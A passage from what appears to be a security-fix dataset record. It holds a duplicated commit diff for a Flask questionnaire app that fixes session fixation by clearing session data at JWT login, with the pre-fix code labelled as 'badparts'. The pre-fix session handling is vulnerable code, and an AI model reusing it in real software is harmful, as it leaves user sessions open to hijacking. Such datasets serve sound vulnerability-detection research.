InvalidTokenException\n from app.authentication.jwt_decoder import JWTDecryptor\n@@ -36,6 +37,11 @@ def jwt_login(self, request):\n         :param request: The flask request\n         :return: the decrypted and unencoded token\n         \"\"\"\n+        # clear the session entry in the database\n+        session_manager.clear()\n+        # also clear the secure cookie data\n+        session.clear()\n+\n         if request.args.get(EQ_URL_QUERY_STRING_JWT_FIELD_NAME) is None:\n             raise NoTokenException(\"Please provide a token\")\n         token = self._jwt_decrypt(request)\ndiff --git a\/app\/authentication\/session_management.py b\/app\/authentication\/session_management.py\nindex 63c97a65b3..fad668ee0f 100644\n--- a\/app\/authentication\/session_management.py\n+++ b\/app\/authentication\/session_management.py\n@@ -25,7 +25,7 @@ def has_user_id(self):\n         \"\"\"\n         pass\n \n-    def remove_user_id(self):\n+    def clear(self):\n         \"\"\"\n         Removes a user id from the session\n         \"\"\"\n@@ -59,14 +59,6 @@ def has_user_ik(self):\n         else:\n             return False\n \n-    def remove_user_ik(self):\n-        \"\"\"\n-        Removes a user id from the session\n-        \"\"\"\n-        logger.debug(\"SessionManager remove_user_ik() - session %s\", session)\n-        if USER_IK in session:\n-            del session[USER_IK]\n-\n     def get_user_ik(self):\n         \"\"\"\n         Retrieves a user's id\n@@ -109,7 +101,7 @@ def has_user_id(self):\n             logger.debug(\"Number of entries for eq session id %s is %s\", eq_session_id, count)\n             return count > 0\n \n-    def remove_user_id(self):\n+    def clear(self):\n         logger.debug(\"DatabaseSessionManager remove_user_id() - session %s\", session)\n         if EQ_SESSION_ID in session:\n             eq_session_id = session[EQ_SESSION_ID]\n@@ -163,10 +155,9 @@ def has_user_id(self):\n         else:\n             return False\n \n-    def remove_user_id(self):\n+    def clear(self):\n         logger.debug(\"FlaskSessionManager remove_user_id() - session %s\", session)\n-        if USER_ID in session:\n-            del session[USER_ID]\n+        session.clear()\n \n     def get_user_id(self):\n         logger.debug(\"FlaskSessionManager get_user_id() - session %s\", session)\ndiff --git a\/tests\/app\/authentication\/test_session_management.py b\/tests\/app\/authentication\/test_session_management.py\nindex 9b586f8b07..84f3bed5f2 100644\n--- a\/tests\/app\/authentication\/test_session_management.py\n+++ b\/tests\/app\/authentication\/test_session_management.py\n@@ -27,7 +27,7 @@ def test_remove_token(self):\n         with self.application.test_request_context():\n             self.session_manager.store_user_id(\"test\")\n             self.assertTrue(self.session_manager.has_user_id())\n-            self.session_manager.remove_user_id()\n+            self.session_manager.clear()\n             self.assertFalse(self.session_manager.has_user_id())\n \n \n","message":"","files":{"\/app\/authentication\/session_management.py":{"changes":[{"diff":"\n         \"\"\"\n         pass\n \n-    def remove_user_id(self):\n+    def clear(self):\n         \"\"\"\n         Removes a user id from the session\n         \"\"\"\n","add":1,"remove":1,"filename":"\/app\/authentication\/session_management.py","badparts":["    def remove_user_id(self):"],"goodparts":["    def clear(self):"]},{"diff":"\n         else:\n             return False\n \n-    def remove_user_ik(self):\n-        \"\"\"\n-        Removes a user id from the session\n-        \"\"\"\n-        logger.debug(\"SessionManager remove_user_ik() - session %s\", session)\n-        if USER_IK in session:\n-            del session[USER_IK]\n-\n     def get_user_ik(self):\n         \"\"\"\n         Retrieves a user's id\n","add":0,"remove":8,"filename":"\/app\/authentication\/session_management.py","badparts":["    def remove_user_ik(self):","        \"\"\"","        Removes a user id from the session","        \"\"\"","        logger.debug(\"SessionManager remove_user_ik() - session %s\", session)","        if USER_IK in session:","            del session[USER_IK]"],"goodparts":[]},{"diff":"\n             logger.debug(\"Number of entries for eq session id %s is %s\", eq_session_id, count)\n             return count > 0\n \n-    def remove_user_id(self):\n+    def clear(self):\n         logger.debug(\"DatabaseSessionManager remove_user_id() - session %s\", session)\n         if EQ_SESSION_ID in session:\n             eq_session_id = session[EQ_SESSION_ID]\n","add":1,"remove":1,"filename":"\/app\/authentication\/session_management.py","badparts":["    def remove_user_id(self):"],"goodparts":["    def clear(self):"]},{"diff":"\n         else:\n             return False\n \n-    def remove_user_id(self):\n+    def clear(self):\n         logger.debug(\"FlaskSessionManager remove_user_id() - session %s\", session)\n-        if USER_ID in session:\n-            del session[USER_ID]\n+        session.clear()\n \n     def get_user_id(self):\n         logger.debug(\"FlaskSessionManager get_user_id() - session %s\", session","add":2,"remove":3,"filename":"\/app\/authentication\/session_management.py","badparts":["    def remove_user_id(self):","        if USER_ID in session:","            del session[USER_ID]"],"goodparts":["    def clear(self):","        session.clear()"]},{"diff":"\n         \"\"\"\n         pass\n \n-    def remove_user_id(self):\n+    def clear(self):\n         \"\"\"\n         Removes a user id from the session\n         \"\"\"\n","add":1,"remove":1,"filename":"\/app\/authentication\/session_management.py","badparts":["    def remove_user_id(self):"],"goodparts":["    def clear(self):"]},{"diff":"\n         else:\n             return False\n \n-    def remove_user_ik(self):\n-        \"\"\"\n-        Removes a user id from the session\n-        \"\"\"\n-        logger.debug(\"SessionManager remove_user_ik() - session %s\", session)\n-        if USER_IK in session:\n-            del session[USER_IK]\n-\n     def get_user_ik(self):\n         \"\"\"\n         Retrieves a user's id\n","add":0,"remove":8,"filename":"\/app\/authentication\/session_management.py","badparts":["    def remove_user_ik(self):","        \"\"\"","        Removes a user id from the session","        \"\"\"","        logger.debug(\"SessionManager remove_user_ik() - session %s\", session)","        if USER_IK in session:","            del session[USER_IK]"],"goodparts":[]},{"diff":"\n             logger.debug(\"Number of entries for eq session id %s is %s\", eq_session_id, count)\n             return count > 0\n \n-    def remove_user_id(self):\n+    def clear(self):\n         logger.debug(\"DatabaseSessionManager remove_user_id() - session %s\", session)\n         if EQ_SESSION_ID in session:\n             eq_session_id = session[EQ_SESSION_ID]\n","add":1,"remove":1,"filename":"\/app\/authentication\/session_management.py","badparts":["    def remove_user_id(self):"],"goodparts":["    def clear(self):"]},{"diff":"\n         else:\n             return False\n \n-    def remove_user_id(self):\n+    def clear(self):\n         logger.debug(\"FlaskSessionManager remove_user_id() - session %s\", session)\n-        if USER_ID in session:\n-            del session[USER_ID]\n+        session.clear()\n \n     def get_user_id(self):\n         logger.debug(\"FlaskSessionManager get_user_id() - session %s\", session","add":2,"remove":3,"filename":"\/app\/authentication\/session_management.py","badparts":["    def remove_user_id(self):","        if USER_ID in session:","            del session[USER_ID]"],"goodparts":["    def clear(self):","        session.clear()"]}],"source":"\nfrom flask import session from app import settings from app.data_model.database import db_session, EQSession import logging from uuid import uuid4 USER_ID=\"user_id\" USER_IK=\"user_ik\" EQ_SESSION_ID=\"eq-session-id\" logger=logging.getLogger(__name__) class SessionManagement(object): def store_user_id(self, user_id): \"\"\" Store a user's id for retrieval later :param user_id: the user id \"\"\" pass def has_user_id(self): \"\"\" Checks if a user has a stored id :return: boolean value \"\"\" pass def remove_user_id(self): \"\"\" Removes a user id from the session \"\"\" pass def get_user_id(self): \"\"\" Retrieves a user's id :return: the user's JWT \"\"\" pass def store_user_ik(self, user_ik): ''' Store a user's ik in the cookie for retrieval later :param user_ik: the user ik ''' logger.debug(\"SessionManager store_user_ik() -session %s\", session) if USER_IK not in session: session[USER_IK]=user_ik session.permanent=True def has_user_ik(self): \"\"\" Checks if a user has a stored ik :return: boolean value \"\"\" logger.debug(\"SessionManager has_user_ik() -session %s\", session) if USER_IK in session: return session[USER_IK] is not None else: return False def remove_user_ik(self): \"\"\" Removes a user id from the session \"\"\" logger.debug(\"SessionManager remove_user_ik() -session %s\", session) if USER_IK in session: del session[USER_IK] def get_user_ik(self): \"\"\" Retrieves a user's id :return: the user's JWT \"\"\" logger.debug(\"SessionManager get_user_ik() -session %s\", session) if self.has_user_ik(): return session[USER_IK] else: return None class DatabaseSessionManager(SessionManagement): def store_user_id(self, user_id): logger.debug(\"DatabaseSessionManager store_user_id() -session %s\", session) if EQ_SESSION_ID not in session: eq_session_id=self.create_session_id() logger.debug(\"Created new eq session id %s\", eq_session_id) session[EQ_SESSION_ID]=eq_session_id session.permanent=True eq_session=EQSession(eq_session_id, user_id) logger.debug(\"Constructed EQ Session object %s\", eq_session) else: eq_session_id=session[EQ_SESSION_ID] logger.debug(\"Found eq_session_id %s in session\", eq_session_id) eq_session=self._get_object(eq_session_id) logger.debug(\"Loaded object eq session %s\", eq_session) logger.debug(\"About to commit to database\") db_session.add(eq_session) db_session.commit() logger.debug(\"Committed\") def has_user_id(self): logger.debug(\"DatabaseSessionManager has_user_id() -session %s\", session) if EQ_SESSION_ID in session: eq_session_id=session[EQ_SESSION_ID] count=self.run_count(eq_session_id) logger.debug(\"Number of entries for eq session id %s is %s\", eq_session_id, count) return count > 0 def remove_user_id(self): logger.debug(\"DatabaseSessionManager remove_user_id() -session %s\", session) if EQ_SESSION_ID in session: eq_session_id=session[EQ_SESSION_ID] eq_session=self._get_object(eq_session_id) logger.debug(\"About to delete entry from eq_session table %s\", eq_session) db_session.delete(eq_session) db_session.commit() else: logger.warning(\"No eq session id exists\") def get_user_id(self): logger.debug(\"DatabaseSessionManager get_user_id() -session %s\", session) if EQ_SESSION_ID in session: eq_session_id=session[EQ_SESSION_ID] eq_session=self._get_object(eq_session_id) return eq_session.user_id else: return None def create_session_id(self): while True: new_session_id=str(uuid4()) if self.check_unique(new_session_id): break return new_session_id def check_unique(self, new_session_id): return self.run_count(new_session_id)==0 def _get_object(self, eq_session_id): logger.debug(\"Get the EQ Session object for eq session id %s\", eq_session_id) return EQSession.query.filter(EQSession.eq_session_id==eq_session_id).first() def run_count(self, eq_session_id): logger.debug(\"Running count query for eq session id %s\", eq_session_id) count=EQSession.query.filter(EQSession.eq_session_id==eq_session_id).count() return count class FlaskSessionManager(SessionManagement): def store_user_id(self, user_id): logger.debug(\"FlaskSessionManager store_user_id() -session %s\", session) if USER_ID not in session: session[USER_ID]=user_id session.permanent=True def has_user_id(self): logger.debug(\"FlaskSessionManager has_user_id() -session %s\", session) if USER_ID in session: return session[USER_ID] is not None else: return False def remove_user_id(self): logger.debug(\"FlaskSessionManager remove_user_id() -session %s\", session) if USER_ID in session: del session[USER_ID] def get_user_id(self): logger.debug(\"FlaskSessionManager get_user_id() -session %s\", session) if self.has_user_id(): return session[USER_ID] else: return None if settings.EQ_SERVER_SIDE_STORAGE: session_manager=DatabaseSessionManager() else: session_manager=FlaskSessionManager() ","sourceWithComments":"from flask import session\nfrom app import settings\nfrom app.data_model.database import db_session, EQSession\nimport logging\nfrom uuid import uuid4\n\nUSER_ID = \"user_id\"\nUSER_IK = \"user_ik\"\nEQ_SESSION_ID = \"eq-session-id\"\nlogger = logging.getLogger(__name__)\n\n\nclass SessionManagement(object):\n    def store_user_id(self, user_id):\n        \"\"\"\n        Store a user's id for retrieval later\n        :param user_id: the user id\n        \"\"\"\n        pass\n\n    def has_user_id(self):\n        \"\"\"\n        Checks if a user has a stored id\n        :return: boolean value\n        \"\"\"\n        pass\n\n    def remove_user_id(self):\n        \"\"\"\n        Removes a user id from the session\n        \"\"\"\n        pass\n\n    def get_user_id(self):\n        \"\"\"\n        Retrieves a user's id\n        :return: the user's JWT\n        \"\"\"\n        pass\n\n    def store_user_ik(self, user_ik):\n        '''\n        Store a user's ik in the cookie for retrieval later\n        :param user_ik: the user ik\n        '''\n        logger.debug(\"SessionManager store_user_ik() - session %s\", session)\n        if USER_IK not in session:\n            session[USER_IK] = user_ik\n            session.permanent = True\n\n    def has_user_ik(self):\n        \"\"\"\n        Checks if a user has a stored ik\n        :return: boolean value\n        \"\"\"\n        logger.debug(\"SessionManager has_user_ik() - session %s\", session)\n        if USER_IK in session:\n            return session[USER_IK] is not None\n        else:\n            return False\n\n    def remove_user_ik(self):\n        \"\"\"\n        Removes a user id from the session\n        \"\"\"\n        logger.debug(\"SessionManager remove_user_ik() - session %s\", session)\n        if USER_IK in session:\n            del session[USER_IK]\n\n    def get_user_ik(self):\n        \"\"\"\n        Retrieves a user's id\n        :return: the user's JWT\n        \"\"\"\n        logger.debug(\"SessionManager get_user_ik() - session %s\", session)\n        if self.has_user_ik():\n            return session[USER_IK]\n        else:\n            return None\n\n\nclass DatabaseSessionManager(SessionManagement):\n\n    def store_user_id(self, user_id):\n        logger.debug(\"DatabaseSessionManager store_user_id() - session %s\", session)\n        if EQ_SESSION_ID not in session:\n            eq_session_id = self.create_session_id()\n            logger.debug(\"Created new eq session id %s\", eq_session_id)\n            session[EQ_SESSION_ID] = eq_session_id\n            session.permanent = True\n            eq_session = EQSession(eq_session_id, user_id)\n            logger.debug(\"Constructed EQ Session object %s\", eq_session)\n        else:\n            eq_session_id = session[EQ_SESSION_ID]\n            logger.debug(\"Found eq_session_id %s in session\", eq_session_id)\n            eq_session = self._get_object(eq_session_id)\n            logger.debug(\"Loaded object eq session %s\", eq_session)\n        logger.debug(\"About to commit to database\")\n        db_session.add(eq_session)\n        db_session.commit()\n        logger.debug(\"Committed\")\n\n    def has_user_id(self):\n        logger.debug(\"DatabaseSessionManager has_user_id() - session %s\", session)\n        if EQ_SESSION_ID in session:\n            eq_session_id = session[EQ_SESSION_ID]\n\n            count = self.run_count(eq_session_id)\n            logger.debug(\"Number of entries for eq session id %s is %s\", eq_session_id, count)\n            return count > 0\n\n    def remove_user_id(self):\n        logger.debug(\"DatabaseSessionManager remove_user_id() - session %s\", session)\n        if EQ_SESSION_ID in session:\n            eq_session_id = session[EQ_SESSION_ID]\n            eq_session = self._get_object(eq_session_id)\n            logger.debug(\"About to delete entry from eq_session table %s\", eq_session)\n            db_session.delete(eq_session)\n            db_session.commit()\n        else:\n            logger.warning(\"No eq session id exists\")\n\n    def get_user_id(self):\n        logger.debug(\"DatabaseSessionManager get_user_id() - session %s\", session)\n        if EQ_SESSION_ID in session:\n            eq_session_id = session[EQ_SESSION_ID]\n            eq_session = self._get_object(eq_session_id)\n            return eq_session.user_id\n        else:\n            return None\n\n    def create_session_id(self):\n        while True:\n            new_session_id = str(uuid4())\n            if self.check_unique(new_session_id):\n                break\n        return new_session_id\n\n    def check_unique(self, new_session_id):\n        return self.run_count(new_session_id) == 0\n\n    def _get_object(self, eq_session_id):\n        logger.debug(\"Get the EQ Session object for eq session id %s\", eq_session_id)\n        return EQSession.query.filter(EQSession.eq_session_id == eq_session_id).first()\n\n    def run_count(self, eq_session_id):\n        logger.debug(\"Running count query for eq session id %s\", eq_session_id)\n        count = EQSession.query.filter(EQSession.eq_session_id == eq_session_id).count()\n        return count\n\n\nclass FlaskSessionManager(SessionManagement):\n    def store_user_id(self, user_id):\n        logger.debug(\"FlaskSessionManager store_user_id() - session %s\", session)\n        if USER_ID not in session:\n            session[USER_ID] = user_id\n            session.permanent = True\n\n    def has_user_id(self):\n        logger.debug(\"FlaskSessionManager has_user_id() - session %s\", session)\n        if USER_ID in session:\n            return session[USER_ID] is not None\n        else:\n            return False\n\n    def remove_user_id(self):\n        logger.debug(\"FlaskSessionManager remove_user_id() - session %s\", session)\n        if USER_ID in session:\n            del session[USER_ID]\n\n    def get_user_id(self):\n        logger.debug(\"FlaskSessionManager get_user_id() - session %s\", session)\n        if self.has_user_id():\n            return session[USER_ID]\n        else:\n            return None\n\nif settings.EQ_SERVER_SIDE_STORAGE:\n    session_manager = DatabaseSessionManager()\nelse:\n    session_manager = FlaskSessionManager()\n"},"\/tests\/app\/authentication\/test_session_management.py":{"changes":[{"diff":"\n         with self.application.test_request_context():\n             self.session_manager.store_user_id(\"test\")\n             self.assertTrue(self.session_manager.has_user_id())\n-            self.session_manager.remove_user_id()\n+            self.session_manager.clear()\n             self.assertFalse(self.session_manager.has_user_id())\n \n \n","add":1,"remove":1,"filename":"\/tests\/app\/authentication\/test_session_management.py","badparts":["            self.session_manager.remove_user_id()"],"goodparts":["            self.session_manager.clear()"]},{"diff":"\n         with self.application.test_request_context():\n             self.session_manager.store_user_id(\"test\")\n             self.assertTrue(self.session_manager.has_user_id())\n-            self.session_manager.remove_user_id()\n+            self.session_manager.clear()\n             self.assertFalse(self.session_manager.has_user_id())\n \n \n","add":1,"remove":1,"filename":"\/tests\/app\/authentication\/test_session_management.py","badparts":["            self.session_manager.remove_user_id()"],"goodparts":["            self.session_manager.clear()"]}],"source":"\nfrom app.authentication.session_management import FlaskSessionManager, DatabaseSessionManager from flask import Flask import unittest from datetime import timedelta from app import settings class BaseSessionManagerTest(unittest.TestCase): def setUp(self): application=Flask(__name__) application.config['TESTING']=True application.secret_key='you will not guess' application.permanent_session_lifetime=timedelta(seconds=1) self.application=application self.session_manager=FlaskSessionManager() def test_has_token_empty(self): with self.application.test_request_context(): self.assertFalse(self.session_manager.has_user_id()) def test_has_token(self): with self.application.test_request_context(): self.session_manager.store_user_id(\"test\") self.assertTrue(self.session_manager.has_user_id()) def test_remove_token(self): with self.application.test_request_context(): self.session_manager.store_user_id(\"test\") self.assertTrue(self.session_manager.has_user_id()) self.session_manager.remove_user_id() self.assertFalse(self.session_manager.has_user_id()) class TestDatabaseSessionManager(BaseSessionManagerTest): def setUp(self): super().setUp() settings.EQ_SERVER_SIDE_STORAGE_DATABASE_URL=\"sqlite:\/\/\" self.session_manager=DatabaseSessionManager() class TestFlaskSessionManager(BaseSessionManagerTest): def setUp(self): super().setUp() self.session_manager=FlaskSessionManager() if __name__=='__main__': unittest.main() ","sourceWithComments":"from app.authentication.session_management import FlaskSessionManager, DatabaseSessionManager\nfrom flask import Flask\nimport unittest\nfrom datetime import timedelta\nfrom app import settings\n\n\nclass BaseSessionManagerTest(unittest.TestCase):\n    def setUp(self):\n        application = Flask(__name__)\n        application.config['TESTING'] = True\n        application.secret_key = 'you will not guess'\n        application.permanent_session_lifetime = timedelta(seconds=1)\n        self.application = application\n        self.session_manager = FlaskSessionManager()\n\n    def test_has_token_empty(self):\n        with self.application.test_request_context():\n            self.assertFalse(self.session_manager.has_user_id())\n\n    def test_has_token(self):\n        with self.application.test_request_context():\n            self.session_manager.store_user_id(\"test\")\n            self.assertTrue(self.session_manager.has_user_id())\n\n    def test_remove_token(self):\n        with self.application.test_request_context():\n            self.session_manager.store_user_id(\"test\")\n            self.assertTrue(self.session_manager.has_user_id())\n            self.session_manager.remove_user_id()\n            self.assertFalse(self.session_manager.has_user_id())\n\n\nclass TestDatabaseSessionManager(BaseSessionManagerTest):\n    def setUp(self):\n        super().setUp()\n        # Use an in memory database\n        settings.EQ_SERVER_SIDE_STORAGE_DATABASE_URL = \"sqlite:\/\/\"\n        self.session_manager = DatabaseSessionManager()\n\n\nclass TestFlaskSessionManager(BaseSessionManagerTest):\n\n    def setUp(self):\n        super().setUp()\n        self.session_manager = FlaskSessionManager()\n\n\nif __name__ == '__main__':\n    unittest.main()\n"}},"msg":"Protect against session fixation attacks"}},"https:\/\/github.com\/ONSdigital\/eq-questionnaire-runner":{"01bb713a7c51a7d742c2dd24f3536a851cbdceb9":{"url":"https:\/\/api.github.com\/repos\/ONSdigital\/eq-questionnaire-runner\/commits\/01bb713a7c51a7d742c2dd24f3536a851cbdceb9","html_url":"https:\/\/github.com\/ONSdigital\/eq-questionnaire-runner\/commit\/01bb713a7c51a7d742c2dd24f3536a851cbdceb9","sha":"01bb713a7c51a7d742c2dd24f3536a851cbdceb9","keyword":"session fixation attack","diff":"diff --git a\/app\/authentication\/authenticator.py b\/app\/authentication\/authenticator.py\nindex 810ee7ba12..e9bdb98b24 100644\n--- a\/app\/authentication\/authenticator.py\n+++ b\/app\/authentication\/authenticator.py\n@@ -1,4 +1,5 @@\n import logging\n+from flask import session\n \n from app.authentication.invalid_token_exception import InvalidTokenException\n from app.authentication.jwt_decoder import JWTDecryptor\n@@ -36,6 +37,11 @@ def jwt_login(self, request):\n         :param request: The flask request\n         :return: the decrypted and unencoded token\n         \"\"\"\n+        # clear the session entry in the database\n+        session_manager.clear()\n+        # also clear the secure cookie data\n+        session.clear()\n+\n         if request.args.get(EQ_URL_QUERY_STRING_JWT_FIELD_NAME) is None:\n             raise NoTokenException(\"Please provide a token\")\n         token = self._jwt_decrypt(request)\ndiff --git a\/app\/authentication\/session_management.py b\/app\/authentication\/session_management.py\nindex 63c97a65b3..fad668ee0f 100644\n--- a\/app\/authentication\/session_management.py\n+++ b\/app\/authentication\/session_management.py\n@@ -25,7 +25,7 @@ def has_user_id(self):\n         \"\"\"\n         pass\n \n-    def remove_user_id(self):\n+    def clear(self):\n         \"\"\"\n         Removes a user id from the session\n         \"\"\"\n@@ -59,14 +59,6 @@ def has_user_ik(self):\n         else:\n             return False\n \n-    def remove_user_ik(self):\n-        \"\"\"\n-        Removes a user id from the session\n-        \"\"\"\n-        logger.debug(\"SessionManager remove_user_ik() - session %s\", session)\n-        if USER_IK in session:\n-            del session[USER_IK]\n-\n     def get_user_ik(self):\n         \"\"\"\n         Retrieves a user's id\n@@ -109,7 +101,7 @@ def has_user_id(self):\n             logger.debug(\"Number of entries for eq session id %s is %s\", eq_session_id, count)\n             return count > 0\n \n-    def remove_user_id(self):\n+    def clear(self):\n         logger.debug(\"DatabaseSessionManager remove_user_id() - session %s\", session)\n         if EQ_SESSION_ID in session:\n             eq_session_id = session[EQ_SESSION_ID]\n@@ -163,10 +155,9 @@ def has_user_id(self):\n         else:\n             return False\n \n-    def remove_user_id(self):\n+    def clear(self):\n         logger.debug(\"FlaskSessionManager remove_user_id() - session %s\", session)\n-        if USER_ID in session:\n-            del session[USER_ID]\n+        session.clear()\n \n     def get_user_id(self):\n         logger.debug(\"FlaskSessionManager get_user_id() - session %s\", session)\ndiff --git a\/tests\/app\/authentication\/test_session_management.py b\/tests\/app\/authentication\/test_session_management.py\nindex 9b586f8b07..84f3bed5f2 100644\n--- a\/tests\/app\/authentication\/test_session_management.py\n+++ b\/tests\/app\/authentication\/test_session_management.py\n@@ -27,7 +27,7 @@ def test_remove_token(self):\n         with self.application.test_request_context():\n             self.session_manager.store_user_id(\"test\")\n             self.assertTrue(self.session_manager.has_user_id())\n-            self.session_manager.remove_user_id()\n+            self.session_manager.clear()\n             self.assertFalse(self.session_manager.has_user_id())\n \n \n","message":"","files":{"\/app\/authentication\/session_management.py":{"changes":[{"diff":"\n         \"\"\"\n         pass\n \n-    def remove_user_id(self):\n+    def clear(self):\n         \"\"\"\n         Removes a user id from the session\n         \"\"\"\n","add":1,"remove":1,"filename":"\/app\/authentication\/session_management.py","badparts":["    def remove_user_id(self):"],"goodparts":["    def clear(self):"]},{"diff":"\n         else:\n             return False\n \n-    def remove_user_ik(self):\n-        \"\"\"\n-        Removes a user id from the session\n-        \"\"\"\n-        logger.debug(\"SessionManager remove_user_ik() - session %s\", session)\n-        if USER_IK in session:\n-            del session[USER_IK]\n-\n     def get_user_ik(self):\n         \"\"\"\n         Retrieves a user's id\n","add":0,"remove":8,"filename":"\/app\/authentication\/session_management.py","badparts":["    def remove_user_ik(self):","        \"\"\"","        Removes a user id from the session","        \"\"\"","        logger.debug(\"SessionManager remove_user_ik() - session %s\", session)","        if USER_IK in session:","            del session[USER_IK]"],"goodparts":[]},{"diff":"\n             logger.debug(\"Number of entries for eq session id %s is %s\", eq_session_id, count)\n             return count > 0\n \n-    def remove_user_id(self):\n+    def clear(self):\n         logger.debug(\"DatabaseSessionManager remove_user_id() - session %s\", session)\n         if EQ_SESSION_ID in session:\n             eq_session_id = session[EQ_SESSION_ID]\n","add":1,"remove":1,"filename":"\/app\/authentication\/session_management.py","badparts":["    def remove_user_id(self):"],"goodparts":["    def clear(self):"]},{"diff":"\n         else:\n             return False\n \n-    def remove_user_id(self):\n+    def clear(self):\n         logger.debug(\"FlaskSessionManager remove_user_id() - session %s\", session)\n-        if USER_ID in session:\n-            del session[USER_ID]\n+        session.clear()\n \n     def get_user_id(self):\n         logger.debug(\"FlaskSessionManager get_user_id() - session %s\", session","add":2,"remove":3,"filename":"\/app\/authentication\/session_management.py","badparts":["    def remove_user_id(self):","        if USER_ID in session:","            del session[USER_ID]"],"goodparts":["    def clear(self):","        session.clear()"]},{"diff":"\n         \"\"\"\n         pass\n \n-    def remove_user_id(self):\n+    def clear(self):\n         \"\"\"\n         Removes a user id from the session\n         \"\"\"\n","add":1,"remove":1,"filename":"\/app\/authentication\/session_management.py","badparts":["    def remove_user_id(self):"],"goodparts":["    def clear(self):"]},{"diff":"\n         else:\n             return False\n \n-    def remove_user_ik(self):\n-        \"\"\"\n-        Removes a user id from the session\n-        \"\"\"\n-        logger.debug(\"SessionManager remove_user_ik() - session %s\", session)\n-        if USER_IK in session:\n-            del session[USER_IK]\n-\n     def get_user_ik(self):\n         \"\"\"\n         Retrieves a user's id\n","add":0,"remove":8,"filename":"\/app\/authentication\/session_management.py","badparts":["    def remove_user_ik(self):","        \"\"\"","        Removes a user id from the session","        \"\"\"","        logger.debug(\"SessionManager remove_user_ik() - session %s\", session)","        if USER_IK in session:","            del session[USER_IK]"],"goodparts":[]},{"diff":"\n             logger.debug(\"Number of entries for eq session id %s is %s\", eq_session_id, count)\n             return count > 0\n \n-    def remove_user_id(self):\n+    def clear(self):\n         logger.debug(\"DatabaseSessionManager remove_user_id() - session %s\", session)\n         if EQ_SESSION_ID in session:\n             eq_session_id = session[EQ_SESSION_ID]\n","add":1,"remove":1,"filename":"\/app\/authentication\/session_management.py","badparts":["    def remove_user_id(self):"],"goodparts":["    def clear(self):"]},{"diff":"\n         else:\n             return False\n \n-    def remove_user_id(self):\n+    def clear(self):\n         logger.debug(\"FlaskSessionManager remove_user_id() - session %s\", session)\n-        if USER_ID in session:\n-            del session[USER_ID]\n+        session.clear()\n \n     def get_user_id(self):\n         logger.debug(\"FlaskSessionManager get_user_id() - session %s\", session","add":2,"remove":3,"filename":"\/app\/authentication\/session_management.py","badparts":["    def remove_user_id(self):","        if USER_ID in session:","            del session[USER_ID]"],"goodparts":["    def clear(self):","        session.clear()"]}],"source":"\nfrom flask import session from app import settings from app.data_model.database import db_session, EQSession import logging from uuid import uuid4 USER_ID=\"user_id\" USER_IK=\"user_ik\" EQ_SESSION_ID=\"eq-session-id\" logger=logging.getLogger(__name__) class SessionManagement(object): def store_user_id(self, user_id): \"\"\" Store a user's id for retrieval later :param user_id: the user id \"\"\" pass def has_user_id(self): \"\"\" Checks if a user has a stored id :return: boolean value \"\"\" pass def remove_user_id(self): \"\"\" Removes a user id from the session \"\"\" pass def get_user_id(self): \"\"\" Retrieves a user's id :return: the user's JWT \"\"\" pass def store_user_ik(self, user_ik): ''' Store a user's ik in the cookie for retrieval later :param user_ik: the user ik ''' logger.debug(\"SessionManager store_user_ik() -session %s\", session) if USER_IK not in session: session[USER_IK]=user_ik session.permanent=True def has_user_ik(self): \"\"\" Checks if a user has a stored ik :return: boolean value \"\"\" logger.debug(\"SessionManager has_user_ik() -session %s\", session) if USER_IK in session: return session[USER_IK] is not None else: return False def remove_user_ik(self): \"\"\" Removes a user id from the session \"\"\" logger.debug(\"SessionManager remove_user_ik() -session %s\", session) if USER_IK in session: del session[USER_IK] def get_user_ik(self): \"\"\" Retrieves a user's id :return: the user's JWT \"\"\" logger.debug(\"SessionManager get_user_ik() -session %s\", session) if self.has_user_ik(): return session[USER_IK] else: return None class DatabaseSessionManager(SessionManagement): def store_user_id(self, user_id): logger.debug(\"DatabaseSessionManager store_user_id() -session %s\", session) if EQ_SESSION_ID not in session: eq_session_id=self.create_session_id() logger.debug(\"Created new eq session id %s\", eq_session_id) session[EQ_SESSION_ID]=eq_session_id session.permanent=True eq_session=EQSession(eq_session_id, user_id) logger.debug(\"Constructed EQ Session object %s\", eq_session) else: eq_session_id=session[EQ_SESSION_ID] logger.debug(\"Found eq_session_id %s in session\", eq_session_id) eq_session=self._get_object(eq_session_id) logger.debug(\"Loaded object eq session %s\", eq_session) logger.debug(\"About to commit to database\") db_session.add(eq_session) db_session.commit() logger.debug(\"Committed\") def has_user_id(self): logger.debug(\"DatabaseSessionManager has_user_id() -session %s\", session) if EQ_SESSION_ID in session: eq_session_id=session[EQ_SESSION_ID] count=self.run_count(eq_session_id) logger.debug(\"Number of entries for eq session id %s is %s\", eq_session_id, count) return count > 0 def remove_user_id(self): logger.debug(\"DatabaseSessionManager remove_user_id() -session %s\", session) if EQ_SESSION_ID in session: eq_session_id=session[EQ_SESSION_ID] eq_session=self._get_object(eq_session_id) logger.debug(\"About to delete entry from eq_session table %s\", eq_session) db_session.delete(eq_session) db_session.commit() else: logger.warning(\"No eq session id exists\") def get_user_id(self): logger.debug(\"DatabaseSessionManager get_user_id() -session %s\", session) if EQ_SESSION_ID in session: eq_session_id=session[EQ_SESSION_ID] eq_session=self._get_object(eq_session_id) return eq_session.user_id else: return None def create_session_id(self): while True: new_session_id=str(uuid4()) if self.check_unique(new_session_id): break return new_session_id def check_unique(self, new_session_id): return self.run_count(new_session_id)==0 def _get_object(self, eq_session_id): logger.debug(\"Get the EQ Session object for eq session id %s\", eq_session_id) return EQSession.query.filter(EQSession.eq_session_id==eq_session_id).first() def run_count(self, eq_session_id): logger.debug(\"Running count query for eq session id %s\", eq_session_id) count=EQSession.query.filter(EQSession.eq_session_id==eq_session_id).count() return count class FlaskSessionManager(SessionManagement): def store_user_id(self, user_id): logger.debug(\"FlaskSessionManager store_user_id() -session %s\", session) if USER_ID not in session: session[USER_ID]=user_id session.permanent=True def has_user_id(self): logger.debug(\"FlaskSessionManager has_user_id() -session %s\", session) if USER_ID in session: return session[USER_ID] is not None else: return False def remove_user_id(self): logger.debug(\"FlaskSessionManager remove_user_id() -session %s\", session) if USER_ID in session: del session[USER_ID] def get_user_id(self): logger.debug(\"FlaskSessionManager get_user_id() -session %s\", session) if self.has_user_id(): return session[USER_ID] else: return None if settings.EQ_SERVER_SIDE_STORAGE: session_manager=DatabaseSessionManager() else: session_manager=FlaskSessionManager() ","sourceWithComments":"from flask import session\nfrom app import settings\nfrom app.data_model.database import db_session, EQSession\nimport logging\nfrom uuid import uuid4\n\nUSER_ID = \"user_id\"\nUSER_IK = \"user_ik\"\nEQ_SESSION_ID = \"eq-session-id\"\nlogger = logging.getLogger(__name__)\n\n\nclass SessionManagement(object):\n    